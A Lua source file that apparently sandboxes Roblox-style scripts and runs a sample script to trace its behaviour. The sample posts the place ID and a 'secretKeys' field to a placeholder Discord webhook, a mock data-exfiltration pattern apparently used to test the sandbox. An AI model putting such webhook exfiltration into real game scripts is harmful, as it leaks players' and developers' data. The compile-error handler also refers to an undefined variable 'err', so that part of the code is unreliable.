local Instance = require("./instances/Instance")
local DataModel = require("./instances/DataModel")
local trace = require("./logger/trace")
local buildRequire = require("./env/require")

local SandboxEnv = {
    game = DataModel.game,
    workspace = DataModel.workspace,

    Instance = {
        new = Instance.new
    },

    print = print,
    warn = warn,

    math = math,
    string = string,
    table = table
}

SandboxEnv.require = buildRequire(SandboxEnv)

local function executeCode(codeString)
    trace.clear()

    local fn, error = loadstring(codeString)

    if not fn then
        warn("Failed to compile code: ", err)
        return
    end

    setfenv(fn, SandboxEnv)

    print("Compiling code")
    local success, runtimeErr = pcall(fn)
    print("Compiler finished")
    print(trace.dumpJSON())

    if not success then
        warn("Script Error:", runtimeErr)
    end
end

executeCode([[
    local part = Instance.new("Part")
    part.Name = "test part"
    part.Parent = workspace
    
    print("Workspace children count:", #workspace:GetChildren())
    print("Found part:", workspace:FindFirstChild("test part").Name)
    print(game.PlaceId)

    local http = game:GetService("HttpService")
    
    local data = {
        placeId = game.PlaceId,
        players = "test",
        secretKeys = "key1"
    }
    
    local payload = http:JSONEncode(data)
    http:PostAsync("https://discord.com/api/webhooks/1234/abcd", payload)
    print("sent to log.")
]])